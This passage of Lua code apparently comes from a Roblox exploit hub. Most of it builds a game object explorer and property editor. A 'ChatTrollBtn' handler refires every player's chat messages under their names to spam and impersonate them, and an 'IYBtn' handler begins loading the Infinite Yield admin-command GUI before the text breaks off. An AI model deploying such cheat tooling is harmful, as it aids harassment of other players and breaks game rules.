		table.insert(descendants,v.Obj)
		f.nodeDescendants(v,descendants)
	end
end

function f.removeObject(obj,noupdate,recurse)
	ypcall(function()
		local node = nodes[obj]
		if node then
			local par = node.Parent
			for i,v in ipairs(par) do
				if v == node then
					table.remove(par,i)
					break
				end
			end
			
			node.AncestryEvent:Disconnect()
			node.AncestryEvent = nil
			
			node.AddedEvent:Disconnect()
			node.AddedEvent = nil
			
			node.RemovedEvent:Disconnect()
			node.RemovedEvent = nil
			
			if recurse then
				local descendants = {}
				f.nodeDescendants(node,descendants)
				for i,v in ipairs(descendants) do
					f.removeObject(v,true)
				end
			end
			
			nodes[obj] = nil
			
			if not updateDebounce and not noupdate then
				updateDebounce = true
				wait()
				updateDebounce = false
				explorerTree:TreeUpdate()
				f.refreshExplorer()
			end
		end
	end)
end

function f.indexNodes(obj)
	if not nodes[game] then nodes[game] = {Obj = game,Parent = nil} end
	
	local addObject = f.addObject
	local removeObject = f.removeObject
	
	--game.DescendantAdded:Connect(function(obj) spawn(function() addObject(obj) end) end)
	--game.DescendantRemoving:Connect(function(obj) spawn(function() removeObject(obj) end) end)
	
	for i,v in pairs(game:GetChildren()) do
		addObject(v,true,true)
	end
end

function f.gExpanded(obj)
	if explorerData.NodeData and explorerData.NodeData[obj] and explorerData.NodeData[obj].Expanded then
		return true
	end
	return false
end

local searchFunctions = {
	["class:"] = function(token,results)
		local class = string.match(token,"%S+:%s*(%S*)")
		if class == "" then return end
		local foundClass = ""
		for i,v in pairs(API.Classes) do
			if i:lower() == class:lower() then
				foundClass = i
				break
			elseif i:lower():find(class:lower(),1,true) then
				foundClass = i
			end
		end
		
		if foundClass == "" then return end
		
		return function(obj)
			return obj.ClassName == foundClass
		end
	end,
	["isa:"] = function(token,results)
		local class = string.match(token,"%S+:%s*(%S*)")
		if class == "" then return end
		local foundClass = ""
		for i,v in pairs(API.Classes) do
			if i:lower() == class:lower() then
				foundClass = i
				break
			elseif i:lower():find(class:lower(),1,true) then
				foundClass = i
			end
		end
		
		if foundClass == "" then return end
		
		return function(obj)
			return obj:IsA(foundClass)
		end
	end,
	["regex:"] = function(token,results)
		local pattern = string.match(token,"%S+:%s*(%S*)")
		if pattern == "" then return end
		
		return function(obj)
			return obj.Name:find(pattern)
		end
	end,
}

local searchCache = {}

function f.updateSearch(self)
	local searchText = self.SearchText
	if searchText == "" then self.SearchResults = nil return end
	local results = {}
	local tokens = {}
	local checks = {}
	local tokenMap = {}
	
	self.SearchExpanded = {}
	
	-- Splits search text into multiple tokens for multiple searching
	for w in string.gmatch(searchText,"[^|]+") do
		table.insert(tokens,w)
	end
	
	-- Create checks based on search text
	for _,token in pairs(tokens) do
		token = token:match("%s*(.+)")
		tokenMap[token] = true
		local keyword = string.match(token,"%S+:")
		if searchFunctions[keyword] then
			local res = searchFunctions[keyword](token,results)
			if res then checks[token] = res end
		else
			checks[token] = function(obj)
				return obj.Name:lower():find(token:lower(),1,true)
			end
		end
	end
	
	-- Remove uneeded items from cache
	for i,v in pairs(searchCache) do
		if not tokenMap[i] then
			searchCache[i] = nil
		end
	end
	
	-- Perform the searches
	local searchExpanded = self.SearchExpanded	
	
	for token,check in pairs(checks) do
		local newResults = {}
		if searchCache[token] then
			for obj,v in pairs(searchCache[token]) do
				results[obj] = true
				searchExpanded[obj] = math.max(searchExpanded[obj] or 0, 1)
				local par = obj.Parent
				while par and not results[par] or searchExpanded[par] == 1 do
					results[par] = true
					searchExpanded[par] = 2
					par = par.Parent
				end
			end
		else
			for i,v in pairs(game:GetDescendants()) do
				local success,found = pcall(check,v)
				if found and nodes[v] then
					results[v] = true
					newResults[v] = true
					searchExpanded[v] = math.max(searchExpanded[v] or 0, 1)
					local par = v.Parent
					while par and not results[par] or searchExpanded[par] == 1 do
						results[par] = true
						newResults[par] = true
						searchExpanded[par] = 2
						par = par.Parent
					end
				end
			end
			searchCache[token] = newResults
		end
	end
	
	--[[
	for i,v in pairs(game:GetDescendants()) do
		searchCache[token] = {}
		for token,check in pairs(checks) do
			if searchCache[token] then for obj,_ in pairs(searchCache[token]) do results[obj] = true end break end
			local success,found = pcall(check,v)
			if found and nodes[v] then
				results[v] = true
				local par = v.Parent
				while par and not results[par] do
					results[par] = true
					par = par.Parent
				end
				break
			end
		end
	end
	--]]
	self.SearchChecks = checks
	self.SearchResults = results
end

local textWidthRuler = Instance.new("TextLabel",gui)
textWidthRuler.Font = Enum.Font.SourceSans
textWidthRuler.TextSize = 14
textWidthRuler.Visible = false

function f.textWidth(text)
	textWidthRuler.Text = text
	return textWidthRuler.TextBounds.X
end

function f.updateTree(self)
	local isSearching = self.SearchResults
	local searchExpanded = self.SearchExpanded
	
	nodeWidth = 0
	
	local function fillTree(node,tree)
		if not node.Sorted then
			table.sort(node,function(a,b)
				local o1 = a.ExplorerOrder
				local o2 = b.ExplorerOrder
				if o1 ~= o2 then
					return o1 < o2
				elseif a.Obj.Name ~= b.Obj.Name then
					return a.Obj.Name < b.Obj.Name
				elseif a.Obj.ClassName ~= b.Obj.ClassName then
					return a.Obj.ClassName < b.Obj.ClassName
				else
					return a.UID < b.UID
				end
			end)
			node.Sorted = true
		end
		
		for i = 1,#node do
			--node[i].Ind = i
			if not isSearching or (isSearching and isSearching[node[i].Obj]) then
				local textWidth = node[i].Depth * 18 + f.textWidth(node[i].Obj.Name) + 22
				nodeWidth = textWidth > nodeWidth and textWidth or nodeWidth
				table.insert(tree,node[i])
				if (not isSearching and explorerTree.Expanded[node[i]]) or (isSearching and searchExpanded[node[i].Obj] == 2) then
					fillTree(node[i],tree)
				end
			end
		end
	end
	
	self.Tree = {}
	fillTree(nodes[game],self.Tree)
	--self.Scroll:Update()
end

function f.icon(frame,index)
	local row,col = math.floor(index/14%14),math.floor(index%14)
	local pad,border = 2,1
	if not frame then
		frame = Instance.new("Frame")
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(0,16,0,16)
		frame.ClipsDescendants = true
		local newMap = Instance.new("ImageLabel",frame)
		newMap.Name = "Icon"
		newMap.BackgroundTransparency = 1
		newMap.Size = UDim2.new(16,0,16,0)
		newMap.Image = iconMap
	end
	local icon = frame.Icon
	icon.Position = UDim2.new(-col - (pad*(col+1) + border)/16,0,-row - (pad*(row+1) + border)/16,0)
	return frame
end

function f.depth(obj)
	local depth = 0
	local curPar = obj.Parent
	while curPar ~= nil do
		curPar = curPar.Parent
		depth = depth + 1
	end
	return depth
end

local Selection do
	Selection = {
		List = {},
		Selected = {}
	}
	
	function Selection:Add(obj)
		if Selection.Selected[obj] then return end
		
		Selection.Selected[obj] = true
		table.insert(Selection.List,obj)
	end
	
	function Selection:Set(objs)
		for i,v in pairs(Selection.List) do
			Selection.Selected[v] = nil
		end
		Selection.List = {}
		
		for i,v in pairs(objs) do
			if not Selection.Selected[v] then
				Selection.Selected[v] = true
				table.insert(Selection.List,v)
			end
		end
	end
	
	function Selection:Remove(obj)
		if not Selection.Selected[obj] then return end
		
		Selection.Selected[obj] = false
		for i,v in pairs(Selection.List) do
			if v == obj then table.remove(Selection.List,i) break end
		end
	end
end

function f.refreshExplorers(id)
	--wait()
	local e = explorerData
			local window = e.Window
			local scroll = e.Scroll
			local entrySpace = math.floor(window.Content.List.AbsoluteSize.Y / 19) + 1
			
			scroll.TotalSpace = #e.Tree
			scroll.VisibleSpace = entrySpace - 1		
			
			for i = 1,entrySpace do
				local node = e.Tree[i + scroll.Index]
				if node then
					local nodeData = e.NodeData[node.Obj]
					local cEntry = e.Entries[i]
					if not cEntry then
						cEntry = entryTemplate:Clone()
						cEntry.Position = UDim2.new(0,1,0,2 + 19 * #window.Content.List:GetChildren())
						cEntry.Parent = window.Content.List
						e.Entries[i] = cEntry
					
						cEntry.MouseEnter:connect(function()
							local node = e.Tree[i + scroll.Index]
							if node then
								if Selection.Selected[node.Obj] then return end
								cEntry.BackgroundTransparency = 0.7
							end
						end)
						cEntry.MouseLeave:connect(function()
							local node = e.Tree[i + scroll.Index]
							if node then
								if Selection.Selected[node.Obj] then return end
								cEntry.BackgroundTransparency = 1
							end
						end)						
						cEntry.MouseButton1Down:connect(function()
							local node = e.Tree[i + scroll.Index]
							if Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
								Selection:Add(node.Obj)
							else
								Selection:Set({node.Obj})
							end
							f.refreshExplorer()
						end)
						
						cEntry.Indent.Expand.MouseEnter:connect(function()
							local node = e.Tree[i + scroll.Index]
							if node then
								if not e.NodeData[node.Obj] then e.NodeData[node.Obj] = {} end
								if e.NodeData[node.Obj].Expanded then
									f.icon(cEntry.Indent.Expand,iconIndex.NodeExpandedOver)
								else
									f.icon(cEntry.Indent.Expand,iconIndex.NodeCollapsedOver)
								end
							end
						end)
						cEntry.Indent.Expand.MouseLeave:connect(function()
							local node = e.Tree[i + scroll.Index]
							if node then
								if not e.NodeData[node.Obj] then e.NodeData[node.Obj] = {} end
								if e.NodeData[node.Obj].Expanded then
									f.icon(cEntry.Indent.Expand,iconIndex.NodeExpanded)
								else
									f.icon(cEntry.Indent.Expand,iconIndex.NodeCollapsed)
								end
							end
						end)
						cEntry.Indent.Expand.MouseButton1Down:connect(function()
							local node = e.Tree[i + scroll.Index]
							if node then
								if not e.NodeData[node.Obj] then e.NodeData[node.Obj] = {} end
								if e.NodeData[node.Obj].Expanded then
									e.NodeData[node.Obj].Expanded = false
								else
									e.NodeData[node.Obj].Expanded = true
								end
								f.updateTree()
								f.refreshExplorer()
							end
						end)
					end
					
					cEntry.Visible = true
					f.icon(cEntry.Indent.IconFrame,iconIndex[node.Obj.ClassName] or 0)
					cEntry.Indent.EntryName.Text = node.Obj.Name									
					if #node.Obj:GetChildren() > 0 then
						cEntry.Indent.Expand.Visible = true
						if nodeData and nodeData.Expanded then
							f.icon(cEntry.Indent.Expand,iconIndex.NodeExpanded)
						else
							f.icon(cEntry.Indent.Expand,iconIndex.NodeCollapsed)
						end
					else
						cEntry.Indent.Expand.Visible = false
					end
					
					if Selection.Selected[node.Obj] then
						cEntry.Indent.EntryName.TextColor3 = Color3.new(1,1,1)
						cEntry.BackgroundTransparency = 0
					else
						cEntry.Indent.EntryName.TextColor3 = Color3.new(220/255, 220/255, 220/255)
						cEntry.BackgroundTransparency = 1
					end
					
					cEntry.Indent.Position = UDim2.new(0,18*node.Depth,0,0)
				else
					local cEntry = e.Entries[i]
					if cEntry then
						cEntry.Visible = false
					end
				end
			end
			
			-- Outliers
			for i = entrySpace+1, #e.Entries do
				if e.Entries[i] then
					e.Entries[i]:Destroy()
					e.Entries[i] = nil
				end
			end
end

-- Properties Functions

function f.toValue(str,valueType)
	if valueType == "int" or valueType == "float" or valueType == "double" then
		return tonumber(str)
	end
end

function f.childValue(prop,value,obj)
	local propName = prop.Name
	local parentPropName = prop.ParentProp.Name
	local parentPropType = prop.ParentProp.ValueType
	local objProp = obj[parentPropName]
	
	if parentPropType == "Vector3" then
		return Vector3.new(
			propName == "X" and value or objProp.X,
			propName == "Y" and value or objProp.Y,
			propName == "Z" and value or objProp.Z
		)
	elseif parentPropType == "Rect2D" then
		return Rect.new(
			propName == "X0" and value or objProp.Min.X,
			propName == "Y0" and value or objProp.Min.Y,
			propName == "X1" and value or objProp.Max.X,
			propName == "Y1" and value or objProp.Max.Y
		)
	end
end

function f.setProp(prop,str,child)
	local value = f.toValue(str,prop.ValueType)
	if value then
		for i,v in pairs(explorerTree.Selection.List) do
			pcall(function()
				if v:IsA(prop.Class) then
					if #child == 0 then
						v[prop.Name] = value
					else
						v[prop.ParentProp.Name] = f.childValue(prop,value,v)
					end
				end
			end)
		end
	end
end

local propControls = {
	["Default"] = function(prop,child)
		local newMt = setmetatable({},{})
	
		local controlGui,readOnlyText,lastValue
	
		local function setup(self,frame)
			controlGui = resources.PropControls.String:Clone()
			readOnlyText = controlGui.ReadOnly		
		
			if prop.Tags["readonly"] then
				if lastValue then readOnlyText.Text = tostring(lastValue) end
				readOnlyText.Visible = true
				readOnlyText.Parent = frame
			else
				if lastValue then controlGui.Text = tostring(lastValue) end
				controlGui.FocusLost:Connect(function()
					f.setProp(prop,controlGui.Text,child or {})
				end)
				controlGui.Parent = frame
			end	
		end
		newMt.Setup = setup
	
		local function update(self,value)
			lastValue = value
			if not controlGui then return end
			if not prop.Tags["readonly"] then
				controlGui.Text = tostring(value)
			else
				readOnlyText.Text = tostring(value)
			end
		end	
		newMt.Update = update
	
		local function focus(self)
			controlGui:CaptureFocus()
		end
		newMt.Focus = focus
		return newMt
	end,
	["Vector3"] = function(prop,child)
		local newMt = setmetatable({},{})
	
		local controlGui,readOnlyText
	
		local function setup(self,frame)
			controlGui = resources.PropControls.String:Clone()
			readOnlyText = controlGui.ReadOnly		
		
			if prop.Tags["readonly"] then
				readOnlyText.Visible = true
				readOnlyText.Parent = frame
			else
				controlGui.FocusLost:Connect(function()
					f.setProp(prop,controlGui.Text,child or {})
				end)
				controlGui.Parent = frame
			end	
		end
		newMt.Setup = setup
	
		local function update(self,value)
			if not prop.Tags["readonly"] then
				controlGui.Text = tostring(value)
				self.Children[1].Control:Update(value.X)
				self.Children[2].Control:Update(value.Y)
				self.Children[3].Control:Update(value.Z)
			else
				readOnlyText.Text = tostring(value)
				self.Children[1].Control:Update(value.X)
				self.Children[2].Control:Update(value.Y)
				self.Children[3].Control:Update(value.Z)
			end
		end	
		newMt.Update = update
	
		local function focus(self)
			controlGui:CaptureFocus()
		end
		newMt.Focus = focus
		
		newMt.Children = {
			f.getChildProp(prop,{Name = "X",ValueType = "double",Depth = 2}),
			f.getChildProp(prop,{Name = "Y",ValueType = "double",Depth = 2}),
			f.getChildProp(prop,{Name = "Z",ValueType = "double",Depth = 2})
		}
		
		return newMt
	end,
	["Rect2D"] = function(prop,child)
		local newMt = setmetatable({},{})
	
		local controlGui,readOnlyText
	
		local function setup(self,frame)
			controlGui = resources.PropControls.String:Clone()
			readOnlyText = controlGui.ReadOnly		
		
			if prop.Tags["readonly"] then
				readOnlyText.Visible = true
				readOnlyText.Parent = frame
			else
				controlGui.FocusLost:Connect(function()
					f.setProp(prop,controlGui.Text,child or {})
				end)
				controlGui.Parent = frame
			end	
		end
		newMt.Setup = setup
	
		local function update(self,value)
			if not prop.Tags["readonly"] then
				controlGui.Text = tostring(value)
				self.Children[1].Control:Update(value.Min.X)
				self.Children[2].Control:Update(value.Min.Y)
				self.Children[3].Control:Update(value.Max.X)
				self.Children[4].Control:Update(value.Max.Y)
			else
				readOnlyText.Text = tostring(value)
				self.Children[1].Control:Update(value.Min.X)
				self.Children[2].Control:Update(value.Min.Y)
				self.Children[3].Control:Update(value.Max.X)
				self.Children[4].Control:Update(value.Max.Y)
			end
		end	
		newMt.Update = update
	
		local function focus(self)
			controlGui:CaptureFocus()
		end
		newMt.Focus = focus
		
		newMt.Children = {
			f.getChildProp(prop,{Name = "X0",ValueType = "double",Depth = 2}),
			f.getChildProp(prop,{Name = "Y0",ValueType = "double",Depth = 2}),
			f.getChildProp(prop,{Name = "X1",ValueType = "double",Depth = 2}),
			f.getChildProp(prop,{Name = "Y1",ValueType = "double",Depth = 2})
		}
		
		return newMt
	end
}

function f.getPropControl(prop,child)
	local control = propControls[prop.ValueType] or propControls["Default"]
	return control(prop,child)
end

--[[
local propExpandable = {
	["Vector3"] = true
}
--]]

--[[
function f.getChildrenControls(obj,prop)
	local children = {}
	if prop.ValueType == "Vector3" then
		local newProp = {}
		for i,v in pairs(prop) do newProp[i] = v end
		newProp.ValueType = "double"
		newProp.Name = "X"
		newProp.ParentName = prop.Name
		newProp.ParentType = prop.ValueType
		local newNode = {
			Prop = newProp,
			RefName = prop.Class.."|"..prop.Name.."|X",
			Control = f.getPropControl(newProp,{"X"}),
			Depth = 2,
			Obj = obj,
			Children = {}
		}
		table.insert(children,newNode)
	end
	return children
end
--]]

function f.getChildProp(prop,data)
	local newProp = {
		Name = data.Name,
		ValueType = data.ValueType,
		ParentProp = prop,
		Tags = prop.Tags,
		Class = prop.Class
	}
	local childNode = {
		Prop = newProp,
		RefName = prop.Class.."|"..prop.Name.."|"..data.Name,
		Control = f.getPropControl(newProp,{data.Name}),
		Depth = data.Depth,
		Children = {}
	}
	return childNode
end

function f.updatePropTree(self)
	self.Tree = {}
	
	propWidth = 0
	local gotProps = {}
	local props = {}
	local newTree = {}	
	
	for i,v in pairs(explorerTree.Selection.List) do
		local class = API.Classes[v.ClassName]
		while class ~= nil and not gotProps[class.Name] do
			for _,prop in pairs(class.Properties) do
				pcall(function()
					local check = v[prop.Name]
					local categoryList = propCategories[class.Name] or {}
					local newNode = {
						Prop = prop,
						RefName = class.Name.."|"..prop.Name,
						Obj = v,
						Control = f.getPropControl(prop),
						Depth = 1,
						--Children = f.getChildrenControls(v,prop)
					}
					--f.setupControls(newNode)
					--newNode.Control.Children = newNode.Children
					local textWidth = f.textWidth(prop.Name) + newNode.Depth * 18 + 5
					propWidth = textWidth > propWidth and textWidth or propWidth
					table.insert(props,newNode)
				end)
			end
			gotProps[class.Name] = true
			class = API.Classes[class.Superclass]
		end
	end
	
	table.sort(props,function(a,b)
		local o1 = categoryOrder[a.Prop.Category] or 0
		local o2 = categoryOrder[b.Prop.Category] or 0
		if o1 ~= o2 then
			return o1 < o2
		else
			return a.Prop.Name < b.Prop.Name
		end
	end)
	
	local nextCategory = ""
	local categoryNode
	for i,v in pairs(props) do
		if nextCategory ~= v.Prop.Category then
			nextCategory = v.Prop.Category
			categoryNode = {
				Category = true,
				RefName = "CAT:"..nextCategory,
				Prop = {Name=nextCategory},
				Depth = 1
			}
			table.insert(newTree,categoryNode)
		end
		if self.Expanded["CAT:"..nextCategory] then
			table.insert(newTree,v)
			if v.Control.Children and self.Expanded[v.RefName] then
				for _,child in pairs(v.Control.Children) do
					table.insert(newTree,child)
				end
			end
		end
	end
	
	self.Tree = newTree
end

function f.newProperties()
	local newgui = getResource("PropertiesPanel")
	local propertiesScroll = ScrollBar.new()
	local propertiesScrollH = ScrollBar.new(true)
	local newTree = TreeView.new()
	newTree.NodeTemplate = getResource("PEntry")
	newTree.Height = 22
	newTree.OffY = 0
	newTree.Scroll = propertiesScroll
	newTree.DisplayFrame = newgui.Content.List
	newTree.TreeUpdate = f.updatePropTree
	newTree.SearchText = ""
	
	local changeEvents = {}
	local drawOrder = 0
	
	newTree.PreUpdate = function(self)
		drawOrder = 0
		for i,v in pairs(changeEvents) do v:Disconnect() changeEvents[i] = nil end
	end
	
	newTree.NodeCreate = function(self,entry,i)	
		entry.MouseEnter:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if self.Selection.Selected[node.RefName] then return end
				entry.Indent.BackgroundTransparency = 0.7
			end
		end)
		entry.MouseLeave:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if self.Selection.Selected[node.RefName] then return end
				entry.Indent.BackgroundTransparency = 1
			end
		end)						
		entry.MouseButton1Down:Connect(function()
			local node = self.Tree[i + self.Index]
			--node.Control:Focus()
		end)
		entry.MouseButton2Down:Connect(function()
			local node = self.Tree[i + self.Index]
			--node.Control:Focus()
		end)
						
		entry.Indent.Expand.MouseEnter:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if (not self.SearchResults and self.Expanded[node]) or (self.SearchResults and self.SearchExpanded[node.Obj]) then
					f.icon(entry.Indent.Expand,iconIndex.NodeExpandedOver)
				else
					f.icon(entry.Indent.Expand,iconIndex.NodeCollapsedOver)
				end
			end
		end)
		entry.Indent.Expand.MouseLeave:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if (not self.SearchResults and self.Expanded[node]) or (self.SearchResults and self.SearchExpanded[node.Obj]) then
					f.icon(entry.Indent.Expand,iconIndex.NodeExpanded)
				else
					f.icon(entry.Indent.Expand,iconIndex.NodeCollapsed)
				end
			end
		end)
		entry.Indent.Expand.MouseButton1Down:Connect(function()
			local node = self.Tree[i + self.Index]
			self:Expand(node.RefName)
		end)
	end
	
	newTree.NodeDraw = function(self,entry,node)
		entry.Indent.EntryName.Text = node.Prop.Name
		entry.Indent.Control:ClearAllChildren()
		
		if not node.Category then
			-- Update property controls
			node.Control:Setup(entry.Indent.Control)
			if node.Depth > 1 then
				--node.Control:Update(node.Obj[node.Prop.ParentName][node.Prop.Name])
			else
				node.Control:Update(node.Obj[node.Prop.Name])
			end
		
			-- Color switching
			--if drawOrder % 2 == 0 and not node.Category then
			--	entry.BackgroundColor3 = Color3.new(96/255,96/255,96/255)
			--else
				entry.BackgroundColor3 = Color3.new(80/255,80/255,80/255)
			--end
		else
			entry.BackgroundColor3 = Color3.new(64/255,64/255,64/255)
		end
		drawOrder = drawOrder + 1
		
		-- Fonts for category nodes and property nodes
		if node.Category then
			entry.Indent.Sep.Visible = false
			entry.Indent.EntryName.Font = Enum.Font.SourceSansBold
			entry.Indent.EntryName.TextColor3 = Color3.new(220/255,220/255,220/255)
		else
			entry.Indent.Sep.Visible = true
			entry.Indent.EntryName.Font = Enum.Font.SourceSans
			if node.Prop.Tags["readonly"] then
				entry.Indent.EntryName.TextColor3 = Color3.new(144/255,144/255,144/255)
			else
				entry.Indent.EntryName.TextColor3 = Color3.new(220/255,220/255,220/255)
			end
		end
		
		if node.Category or node.Control.Children then
			entry.Indent.Expand.Visible = true
			if self.Expanded[node.RefName] then
				f.icon(entry.Indent.Expand,iconIndex.NodeExpanded)
			else
				f.icon(entry.Indent.Expand,iconIndex.NodeCollapsed)
			end
		else
			entry.Indent.Expand.Visible = false
		end
					
		if self.Selection.Selected[node.Obj] then
			entry.Indent.EntryName.TextColor3 = Color3.new(1,1,1)
			entry.Indent.BackgroundTransparency = 0
		else
			--entry.Indent.EntryName.TextColor3 = Color3.new(220/255, 220/255, 220/255)
			entry.Indent.BackgroundTransparency = 1
		end
		
		if not node.Category and node.Depth == 1 then
			changeEvents[node.Obj] = node.Obj:GetPropertyChangedSignal(node.Prop.Name):Connect(function()
				node.Control:Update(node.Obj[node.Prop.Name])
			end)
		end
					
		entry.Indent.Position = UDim2.new(0,18*node.Depth,0,0)
		
		local newPropWidth = propWidth - node.Depth*18
		entry.Indent.EntryName.Size = UDim2.new(0,newPropWidth,0,22)
		entry.Indent.Control.Position = UDim2.new(0,newPropWidth+2,0,0)
		entry.Indent.Control.Size = UDim2.new(1,-newPropWidth-2,0,22)
		entry.Indent.Sep.Position = UDim2.new(0,newPropWidth+1,0,0)
		entry.Size = UDim2.new(0,281,0,22)
	end
	
	propertiesScroll.Gui.Parent = newgui.Content
	propertiesScroll:Texture({
		FrameColor = Color3.new(80/255,80/255,80/255),
		ThumbColor = Color3.new(120/255,120/255,120/255),
		ThumbSelectColor = Color3.new(140/255,140/255,140/255),
		ButtonColor = Color3.new(163/255,162/255,165/255),
		ArrowColor = Color3.new(220/255,220/255,220/255)
	})
	propertiesScroll:SetScrollFrame(newgui.Content,3)
	
	propertiesScrollH.Gui.Visible = false
	propertiesScrollH.Gui.Parent = newgui.Content
	propertiesScrollH:Texture({
		FrameColor = Color3.new(80/255,80/255,80/255),
		ThumbColor = Color3.new(120/255,120/255,120/255),
		ThumbSelectColor = Color3.new(140/255,140/255,140/255),
		ButtonColor = Color3.new(163/255,162/255,165/255),
		ArrowColor = Color3.new(220/255,220/255,220/255)
	})
	propertiesScrollH.Gui.Position = UDim2.new(0,0,1,-16)
	propertiesScrollH.Gui.Size = UDim2.new(1,-16,0,16)
	
	newTree.OnUpdate = function(self)
		local guiX = propertiesPanel.Content.AbsoluteSize.X-16
		--[[
		propertiesScrollH.VisibleSpace = guiX
		propertiesScrollH.TotalSpace = nodeWidth+10
		if nodeWidth > guiX then
			explorerScrollH.Gui.Visible = true
			explorerScroll.Gui.Size = UDim2.new(0,16,1,-16)
			self.DisplayFrame.Size = UDim2.new(1,-16,1,-16)
		else
			explorerScrollH.Gui.Visible = false
			explorerScroll.Gui.Size = UDim2.new(0,16,1,0)
			self.DisplayFrame.Size = UDim2.new(1,-16,1,0)
		end
		--]]
		propertiesScroll.TotalSpace = #self.Tree + 1
		propertiesScroll.VisibleSpace = math.ceil(self.DisplayFrame.AbsoluteSize.Y / 23)
		propertiesScrollH:Update()		
		propertiesScroll:Update()
	end
	propertiesScroll.OnUpdate = function(self) if newTree.Index == self.Index then return end newTree.Index = self.Index newTree:Refresh() end
	propertiesScrollH.OnUpdate = function(self)
		for i,v in pairs(propertiesTree.Entries) do
			v.Position = UDim2.new(0,-self.Index,0,v.Position.Y.Offset)
		end
	end
	--explorerData = {Window = newgui, NodeData = {}, Scroll = explorerScroll, Entries = {}}
	
	propertiesTree = newTree
	
	table.insert(activeWindows,newgui)
	f.hookWindowListener(newgui)
	newgui.Changed:connect(function(prop) if prop == "AbsoluteSize" or prop == "AbsolutePosition" then newTree:Refresh() end end)
	
	local searchBox = newgui.TopBar.SearchFrame.Search
	local searchAnim = searchBox.Parent.Entering
	searchBox:GetPropertyChangedSignal("Text"):Connect(function()
		--[[
		local searchTime = tick()
		lastSearch = searchTime
		wait()
		if lastSearch ~= searchTime then return end
		newTree.SearchText = searchBox.Text
		f.updateSearch(newTree)
		explorerTree:TreeUpdate()
		explorerTree:Refresh()
		--]]
	end)
	
	searchBox.Focused:Connect(function()
		searchBox.Empty.Visible = false
		searchAnim:TweenSizeAndPosition(UDim2.new(1,0,0,2),UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end)
	
	searchBox.FocusLost:Connect(function()
		if searchBox.Text == "" then searchBox.Empty.Visible = true else searchBox.Empty.Visible = false end
		searchAnim:TweenSizeAndPosition(UDim2.new(0,0,0,2),UDim2.new(0.5,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end)
	
	return newgui
end

local function welcomePlayer()
	welcomeFrame.Visible = true
	welcomeMain.Position = UDim2.new(-0.6,0,0,0)
	welcomeChangelog.Position = UDim2.new(1,5,0,20)
	welcomeBottom.Position = UDim2.new(0.6,0,1,0)
	
	welcomeFrame.BackgroundTransparency = 1
	welcomeOutline.ImageTransparency = 1
	
	wait(2)
	
	for i = 1,0,-0.1 do
		welcomeFrame.BackgroundTransparency = i
		welcomeOutline.ImageTransparency = i
		wait()
	end
	
	welcomeMain:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	welcomeChangelog:TweenPosition(UDim2.new(0.6,5,0,20),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	welcomeBottom:TweenPosition(UDim2.new(0.6,0,1,-50),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	
	wait(0.5)

	welcomeProgress:WaitForChild("Progress1").TextColor3 = Color3.new(1,1,1)	
	API = f.fetchAPI()
	welcomeProgress:WaitForChild("Progress2").TextColor3 = Color3.new(1,1,1)
	RMD = f.fetchRMD()
	welcomeProgress:WaitForChild("Progress3").TextColor3 = Color3.new(1,1,1)
	wait(0.25)
	welcomeProgress:WaitForChild("Progress4").TextColor3 = Color3.new(1,1,1)
	rightClickContext = ContextMenu.new()
	f.indexNodes()
	explorerTree:TreeUpdate()
	wait(0.25)
	welcomeProgress:WaitForChild("Progress5").TextColor3 = Color3.new(1,1,1)
	
	
	-- Attach explorer and properties to right content pane then launch
	explorerTree:Refresh()
	f.addToPane(explorerPanel,"Right")
	f.addToPane(propertiesPanel,"Right")
	f.resizePaneItem(propertiesPanel,"Right",0.5)
		
	contentL:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	contentR:TweenPosition(UDim2.new(1,-explorerSettings.RPaneWidth,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	
	wait(2)
	
	welcomeFrame:TweenPosition(UDim2.new(0.5,-250,0,-350),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
end

mouse.Move:connect(function()
	--if mouseWindow == nil then return end
	local x,y = mouse.X,mouse.Y
	
	if x <= 50 then
		setPane = "Left"
	elseif x >= gui.AbsoluteSize.X - 50 then
		setPane = "Right"
	else
		setPane = "None"
	end
end)

explorerPanel = f.newExplorer()
propertiesPanel = f.newProperties()

for category,_ in pairs(categoryOrder) do
	propertiesTree.Expanded["CAT:"..category] = true
end

propertiesTree.Expanded["CAT:Surface Inputs"] = false
propertiesTree.Expanded["CAT:Surface"] = false

welcomePlayer()

for i,v in pairs(nodes[workspace]) do
	print(type(i))
end
end)

ChatTrollBtn.MouseButton1Down:Connect(function()
local Action = game.Players:GetPlayers()
  for i = 1,#Action do
Action[i].Chatted:connect(function(Message)
  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("".."["..Action[i].Name.."]".." "..Message, "All")
  end)
end
end)

IYBtn.MouseButton1Down:Connect(function()
ver = '1.9'

repeat wait() until game:FindFirstChildOfClass("Players")
Players = game:GetService("Players")
repeat wait() until Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")

local Holder = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dark = Instance.new("Frame")
local Cmdbar = Instance.new("TextBox")
local Dark_2 = Instance.new("Frame")
local CMDsF = Instance.new("ScrollingFrame")
local SettingsButton = Instance.new("ImageButton")
local Settings = Instance.new("Frame")
local Prefix = Instance.new("TextLabel")
local PrefixBox = Instance.new("TextBox")
local Keybinds = Instance.new("TextLabel")
local Select = Instance.new("TextButton")
local StayOpen = Instance.new("TextLabel")
local Button = Instance.new("Frame")
local On = Instance.new("TextButton")
local Positions = Instance.new("TextLabel")
local Select_8 = Instance.new("TextButton")
local Color = Instance.new("TextLabel")
local Select_2 = Instance.new("TextButton")
local Plugins = Instance.new("TextLabel")
local Select_9 = Instance.new("TextButton")
local Example = Instance.new("TextButton")
local Notification = Instance.new("Frame")
